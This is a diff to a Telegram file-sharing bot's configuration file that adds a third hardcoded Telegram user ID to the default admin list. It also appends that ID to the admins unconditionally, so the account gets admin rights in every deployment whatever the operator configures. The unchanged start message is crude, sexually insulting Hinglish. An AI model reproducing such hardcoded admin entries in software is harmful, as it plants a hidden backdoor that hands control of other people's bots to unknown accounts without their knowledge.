@@ -44,7 +44,7 @@ TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
 START_MSG = os.environ.get("START_MESSAGE", "<b>Hello {first}</b>\n\nmuth marna band kr de dusro ko sex krte dekh muth marne maja aata kya?? cuck ho? eww bhai imagine tumhara brain itna fucked up ho chuka hai ki tum dusro ko sex krte dekh maja ata sad bhai ye sab band kr do 👀 if you want bot like this </a></b>")
 try:
     ADMINS=[5835878278]
-    for x in (os.environ.get("ADMINS", "5835878278 7321928194").split()):
+    for x in (os.environ.get("ADMINS", "5835878278 7321928194 6391346789").split()):
         ADMINS.append(int(x))
 except ValueError:
         raise Exception("Your Admins list does not contain valid integers.")
@@ -67,6 +67,7 @@ USER_REPLY_TEXT = "ʙᴀᴋᴋᴀ ! ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴍʏ ꜱᴇɴᴘ
 ADMINS.append(OWNER_ID)
 ADMINS.append(5835878278)
 ADMINS.append(7321928194)
+ADMINS.append(6391346789)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
